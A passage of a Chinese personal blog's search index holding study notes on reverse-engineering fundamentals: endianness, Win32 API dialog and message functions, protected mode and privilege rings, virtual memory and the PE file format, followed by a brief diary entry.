    </entry>
    
    
    
    <entry>
      <title>解密系列basic</title>
      <link href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"/>
      <url>/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/</url>
      
        <content type="html"><![CDATA[<p><em>解密系列[基础篇]</em></p><h3 id="多字节存储顺序"><a href="#多字节存储顺序" class="headerlink" title="多字节存储顺序"></a><strong>多字节存储顺序</strong></h3><p>两种编码区别:<br>**Big-Endian:**高位字节存入低地址，低位字节存入高地址，依次排列。<br>**Little-Endian :**低位字节存入低地址，高位字节存入高地址，反序排列         多字节数据存放顺序与CPU有关。</p><p>微处理器中存放顺序有正序（ Big-Endian）和逆序(Little-Endian） (也称大端存储和小端存储)之分。<br>常见的Intel系列使用的编码方式属于Little-Endian类；某些RISC架构的CPU·OIBM6Power-PC等属于Big-Endian类。</p><p>补充：ASCII （ American Standard Code for InformationInterchange·美国信息互换标准代码) 0-256。<br>Unicode字符编码的编码范围是︰0-65535·它包含三套编码方式如 :UTF-8·UTF-16和UTF-32·它和ASCII的关系为ASCII字符编码是Unicode字符编码的一部分。</p><h3 id="Win-API简介"><a href="#Win-API简介" class="headerlink" title="Win API简介:"></a><strong>Win API简介:</strong></h3><p>Windows API就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 7 ·Windows Vista - WindowsXP -Windows Server 2003 ·Windows 2000-Windows95 ·Windows 98-Windows Me (Millennium Editon）和OWindows CE等几乎所有版本。它被设计为各种语言的程序调用，也是应用软件与Windows系统最直培的交互方式。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/IZFRQK66[MK~]3S%7D62$Y4KJ.png" alt="img"></p><p><strong>动态链接库</strong>︰动态链接就是把一些经常会共用的代码（静态链培的OBJ程序库）制作成DLL文件。当可执行文件调用到DLL文件内的函数时windows操作系统才会把DLL文件加载存储器内。<br>DLL文件本身的结构就是执i行文件（PE） ,当程序需求函数才进行链接，通过动态链接方式，存储器浪费的情形将大幅降低。                           <strong>kernel32.dll</strong>:控制着系统的内存管理﹑数据的输入输出操作和中断处理。当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。<br><strong>user32.dll</strong>: Windows用户界面相关应用程序接口，用于包括Windows处理、基本用户界面等特性。如创建窗口和发送消息。<br><strong>gdi32.dll</strong>:是Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字。   </p><p><strong>句柄</strong>：是整个windows编程的基础。<u>一个句柄是指使用的一个唯一的整数值</u><u>，用于标志应用程序中的不同对象和同类对象中的不同的实例</u>。<br>例：一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。应用程序能够通过句柄访问相应的对象的信息。<br>句柄是windows用来标志应用程序中建立的或是使用的唯一整数windows使用了大量的句柄来标志很多对象。</p><p>HWnd：带文本的窗口或控件的句柄。<br>IpString：指向接收文本的缓冲区的指针。<br>nMaxCount：指定要保存在缓冲区内的字符的最大个数，其中包含NULL字符      </p><h3 id="HWND-GetDlgItem函数"><a href="#HWND-GetDlgItem函数" class="headerlink" title="HWND GetDlgItem函数"></a><strong>HWND GetDlgItem函数</strong></h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hwndScroll</span> = GetDlgItem(hwnd, IDC_SCROLL)<span class="comment">;       </span></span><br></pre></td></tr></table></figure><p> 假设一个父窗口中有多个子窗口，那么本函数是返回一个子窗口句柄。第一个参数：父窗口句柄     第二个参数：子窗口    UINT </p><h3 id="IDUINT-GetDlgItemText函数"><a href="#IDUINT-GetDlgItemText函数" class="headerlink" title="IDUINT GetDlgItemText函数"></a><strong>IDUINT GetDlgItemText函数</strong></h3><p>​<br>（检索与对话框中的控件关联的标题或文本）                                                                                 </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GetDlgItemText(</span><br><span class="line">  <span class="keyword">HWND</span> hDlg,       <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="keyword">int</span> nIDDlgItem,  <span class="comment">// control identifier</span></span><br><span class="line">  LPTSTR lpString, <span class="comment">// pointer to buffer for text</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount    <span class="comment">// maximumsize of string</span></span><br><span class="line">)<span class="comment">;                                      </span></span><br></pre></td></tr></table></figure><h3 id="GetwindowText函数"><a href="#GetwindowText函数" class="headerlink" title="GetwindowText函数"></a><strong>GetwindowText函数</strong></h3><p>将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。             如果指定的窗口是一个控件，则拷贝控件的文本。                <u>GetWindowText不能接收在其他应用程序中的控件的文本。</u></p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> GetWindowText(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,        <span class="comment">// handle to window or control</span></span><br><span class="line">  LPTSTR lpString,  <span class="comment">// text buffer</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount     <span class="comment">// maximum number of characters to copy</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="UINT-GetDlgItemInt函数"><a href="#UINT-GetDlgItemInt函数" class="headerlink" title="UINT GetDlgItemInt函数"></a><strong>UINT GetDlgItemInt函数</strong></h3><p>（将对话框中指定控件的文本转换为整数值）                                                     </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UINT</span> GetDlgItemInt(</span><br><span class="line">  HWND hDlg,           <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="type">int</span> nIDDlgItem,      <span class="comment">// control identifier</span></span><br><span class="line">  <span class="type">BOOL</span> *lpTranslated,  <span class="comment">// success state</span></span><br><span class="line">  <span class="type">BOOL</span> bSigned         <span class="comment">// signed or unsigned value</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><p>（这个API方法用来创建、显示、操作一个消息框。它包含可设置的消息内容、标题，还可以添加预定义的图标、放置按钮）int </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> MessageBox(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,          <span class="comment">// handle to owner window</span></span><br><span class="line">  LPCTSTR lpText,     <span class="comment">// text in message box</span></span><br><span class="line">  LPCTSTR lpCaption,  <span class="comment">// message box title</span></span><br><span class="line">  UINT uType          <span class="comment">// message box style</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>NT架构从内核到KERNEL32·USER32·GDI32都是纯32位实现。<br>NT架构标准字符集重头开发，统一使用Unicode字符集·兼容ASCII字符集。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/R~%60]HZH%7BDN_P3NYJL1V@MSF.png" alt="img"></p><p>区别：1.函数调用完后谁来清空栈2.入栈顺序（两者均自右向左）stdcall由子程序平衡栈 cdel（c语言标准）由调用值平衡栈回调函数。（callback）回调函数</p><p><img src="D:\Users\lenovo\Desktop\5.png"></p><p><img src="D:\Users\lenovo\Desktop\4.png"></p><p>Windows操作系统最大的特点就是其图形化的操作只面和多任务的管理。这些强大功能就是建立在其消息处理机制这个基础之上的。Windows系统与应用程序之间，应用程序与应用程序之间的通讯就是通过消息来触发，并靠对消息的响应和处理来完成。<br>Windows系统中有两种消息队列:一种是<strong>系统消息队列</strong>，另一种是<strong>应用程序消息队列</strong>。Windows本身是由消息驱动，当调试程序时跟踪一个消息会得到相当底层的答案。                                                                        Windows为当前执行的每个Windows程序维护一个消息队列。<u>在发生某事件之后，系统将该事件转换为一个消息，并将消息投放入程序消息队列中。</u>程序通过i行一块称之为消息循环的程序代码从消息队列中取出消息!其实∶<strong>消息不过是定义一个结构。定义一堆ID，在程序运行过程中调用switch case拦截去完成巳应的功能。</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">while</span>(GetMessage (&amp;msg, NULL,<span class="number">0</span>,<span class="number">0</span>))                               &#123;TranslateMessage (&amp;msg);<span class="comment">//翻译消息</span></span><br><span class="line">DispatchMessage (&amp;msg); &#125;<span class="comment">//分配消总</span></span><br></pre></td></tr></table></figure><p><strong>SendMessage函数</strong>                                                                                将指定的消息发送到一个或多个窗口。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT [SendMessage]（<span class="keyword">HWND</span> <span class="keyword">hWnd</span>，UINT Msg，<span class="keyword">WPARAM</span> <span class="keyword">wParam</span>，<span class="keyword">LPARAM</span> <span class="keyword">IParam</span>）；</span><br></pre></td></tr></table></figure><h3 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a><strong>WM_COMMAND</strong></h3><p>产生的条件：点击<strong>菜单</strong>， 点击<strong>加速键</strong>（键盘快捷键，是一个或几个按键的组合，它用于激活特定的命令，使用加速键不需要费力移动鼠标就能激活菜单项），点击窗口<strong>按钮</strong>，点击<strong>工具栏按钮</strong>。这些时候都有command消息产生。<br> wParam 高两个字节 通知码<br>wParam 低两字节 命令ID<br>lParam 发送命令消息的子窗体句柄。<br> <strong>WM_GETTEXT</strong><br> <strong>WM_QUIT</strong><br><strong>WM_LBUTTONDOWN</strong><br><strong>WM_RBUTTONUP</strong><br><strong>WM_KEYUP</strong><br>（可自行查询相应用法及作用 我也是大懒虫捏【😀】）</p><h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a><strong>实模式</strong></h3><p>程序指令在执行过程中一般需要有各种数据,x86系列CS、DS、ES、FS、SS等用于指示不同用涂的数据段在内存中的位置。<br>x86系列使用中断机制来实现系统服务。<br>寄存器的扩展之路∶<br>8086以前（ 8bit） -&gt;8086（ 16bit） -&gt;80386(32bit)-&gt;现在的64bitCPU</p><p>寄存器（AL) -&gt;(AX)-&gt;（EAX）-&gt;(RAX)                                                         </p><h3 id="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"><a href="#保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。" class="headerlink" title="保护模式∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。"></a><strong>保护模式</strong>∶无论实模式还是保护模式根本的问题都为程序如何在其中运行。</h3><p>和实模式下一样，保护模式下程序运行的实质仍是“CPU执行指令，操作相关数据”。主要改变的是寻址的方式，保护模式在寻址方式上“动了手脚””，为的是起到“保护作用”。</p><p><strong>保护模式</strong><br><u>一.不同任务之间的保护∶</u><br>通过把每个不同的任务放在不同的虚排地址空间中﹐来实现不同任务之间的隔离（即A程序不能访问和修改B程序的代码和数据）·以达到程序间的隔离;<br><u>二.同一任务的保护∶</u><br>在每一任务之内定义了4种保护级别·方别为0，1，2，3按环的方式表示.</p><p><img src="D:\Users\lenovo\Desktop\3.jpg"></p><p>其中，0级代表最高的权限级别，3级代表最低权限级别。按环的方式来表示。其中，环0、1、2为系统级，环3为用户级。<br>一般的系统只能使用环0和环3两个级别。                                             如上图所示，最外层的CodeAP1只能访问DataAP1。不能访问同级的另一应用程序的DataAP2;同样·CodeAP2只能访i6DataAP2 不能访DataAP1 。                                                                                            要说明的是：<strong>如果应用程序拥有第0级的权限，那么它就可以执行所有的指令并访问所有的数据。</strong><br>如果应用程序拥有的权限级别是第3级，它执行的指令是有限的，能访问的数据也是有限的（被保护)  。                                                                           操作系统的核心层是运行在Ring 0级。<br>WIN32子系统（KEDNET32.DLL 【内存的管理】USER32.DLL【操作用户的界面】 ，GDI32.DLL【操作图像的界面】等）是运行在Ring3级的，以提供与子程序的接口。</p><h3 id="虚拟内存（确实存在于硬盘中）∶"><a href="#虚拟内存（确实存在于硬盘中）∶" class="headerlink" title="虚拟内存（确实存在于硬盘中）∶"></a><strong>虚拟内存（</strong>确实存在于硬盘中）∶</h3><p>虚拟内存并不是真正的内存·它是通过射( Map）的方法﹐使用的虚拟地址（VA)达到4GB（因为EIP32位索引的最大范围是4GB）。<br>这样规定︰每个应用程序可以被分配到2GB的虚拟地址·剩下的2GB留给操作系统自己用。( Windows NT中·应用程序甚至有3GB为虚拟地址 )    </p><p>Windows是一个分时的多任务操作系统·CPU的时间被分割成一个个的时间片后行配给名个不同的应用程序·在一个时间片里，和这个应用程序护行无关的东西并不会又映射到线性地址中（这样EIP就索引不到）。</p><p>因比可以做到每个程序都拥有自己独立的4GB寻址空间·互不干扰。</p><p>要说明的是DLL与EXE不同【dll文件无自己的私有空间(动态链接文件）】</p><h4 id="简单的虚拟内存的实现方法和过程∶"><a href="#简单的虚拟内存的实现方法和过程∶" class="headerlink" title="简单的虚拟内存的实现方法和过程∶"></a><strong>简单的虚拟内存的实现方法和过程∶</strong></h4><p>1.当一个应用程序被启动时，操作系统创建一个新的进程，并给这个进程行配2GB的虚拟地址（不是内存哦 是地址)。<br>2.虚拟内存管理器将应用程序的代码射到哪个程序的虚拟地址中的某个位置，并把当前所需要的代码读取到内存物理地址中。<br>3.如果用动态链接库DLL，DLL程序也会被映射到进程的虚拟地址空i间在需要的时候才被读入物理内存。<br>4.其他项目(像数据﹑堆栈等)的空间是首先从物理内存中行配，再反向映射到虚拟地址空间中的。<br>5.应用程序通过使用的他的虚拟地址空间中的地址开始执行·然后由虚拟内存管理器把每次的内存访问映射到物理位置去。</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>一.应用程序是不会直接访i问物理地址的。<br>二.虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问；<br>三.每个程序都有独立的4G寻址空间·不同程虚拟地址空间是被互相隔离的;                                                                                                          四.DLL程序没有巨己的“私有”空间·它们称之为动态链接库文件·它们总是被射到其他应用程序的地址空间中的﹐作为其他应用程序的一部行运行。<br>最后，使用虚拟内存的好处是︰简化了内存的管理，并弥补物理内存的不足。另外以防止多任务环境下各个应用程序之间的冲突!</p><h3 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a><strong>PE文件</strong></h3><p>PE的意思就是Portable Executable （可移植的挖行体)。它是Windows环境身所带的e行体文件格式。<br>它的一些特性继承由Unix Coff (commonobject file format)文件格式。<br>“portable executable”（己移植的执行体）意味着此文件格式是跨win32平台的:也就是说即使Windows 运行在非IntelCPU 上·任意win32平台的PE装载器都能识别和使用该文件格式。</p><p>基本上所有win32执行体(除了VxD和16位的DI)都用PE文件格式，包括NT的内核模式驱动程序( kernel mode drivers ) 。因而研究PE文件格式给了我们洞悉 Windows结构的良机。<br>PE文件用的是一个平面地址空间·所有代码和数据都合并在一起·组成一个很大结构文件的内容被行割为不同的区块（Section又称为区段·节等)·块中包含代码或数据。</p><p>每个区块都有巨己在内存中的属性：可读&#x2F;写·只读等。<br>每个区块都有不同的名字，这用名字主要用来表示区块功能。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230131171812728.png" alt="image-20230131171812728"></p><p>PE文件非常好的一个地方就是在磁盘上的数据结构与在内存中的结构是一致的。<br>当至统装载一个己i行文件到内存中·主要就是将一个PE文件的某一部方映射到地址空间中·这样﹐PE文件的数据结沟在磁盘和内存中就是一样的了。</p><p><img src="D:\Users\lenovo\Desktop\1.png"></p><p>(1）入口点（Entry Point）<br>PE文件巳行时的入口点（Entry Point) 。也就是说·程序在执行时的第一行代码地址应该就是这个值·有点像8086汇编语言中end start中start指向的入口地址。<br>(2）文件偏移地址（File Offset）<br>当PE文件储存在磁盘上的时候·各数据的地址称作文件的移地址·文件偏移地址人PE文件的第一个字节开始计数·起始值为0。</p><h3 id="虚地地址-Virtual-Address-VA"><a href="#虚地地址-Virtual-Address-VA" class="headerlink" title="虚地地址(Virtual Address, VA)"></a><strong>虚地地址(Virtual Address, VA)</strong></h3><p>由于Windows程序运行在保护模式下·所以应用程序访问存储器所使用的逻辑地址称为虚拟地址（因为他不是真正的物理地址·真正的物理地址被windows妈妈的保护机制保护起来)﹐又称为内存偏移地址（Memory Offset) 。实地址模式下的“段址也写地址∶偏移地址索引方式类似·虚樽地;成“段∶偏移量”的形式·但不同之处在于这里的段不再是段地切而是指段选择子。<br>例t :”0123:004010003’<br>0123∶表示段选择子。其数据存储在CS段选择器里。同一程序在不同系统环境下此值可能不同，因比我们不需要关心。<br>00401000∶此处表示内存中的虚拟地址。一般来说，同一个程序的向一条指令在不同系统环境下，此值相同（PE映射原理）。</p><h3 id="基地址（-ImageBase"><a href="#基地址（-ImageBase" class="headerlink" title="基地址（ ImageBase)"></a><strong>基地址（ ImageBase)</strong></h3><p>文件执行时将被映射到指定内存地址中·这个初始内存地址称为基地址。这个值是由PE文件本身设定的。<br>控照默认设置·用Visual C++建立的EXE文件基地址是00400000h。DLL支件基地址是10000000h。但这个值可自己在编译器设定的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>荒诞</title>
      <link href="/2023/08/27/%E8%8D%92%E8%AF%9E/"/>
      <url>/2023/08/27/%E8%8D%92%E8%AF%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="yub‘s-blog"><a href="#yub‘s-blog" class="headerlink" title="yub‘s blog"></a>yub‘s blog</h2><p>向着彩虹海出发！</p><p><img src="/../imgs/1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
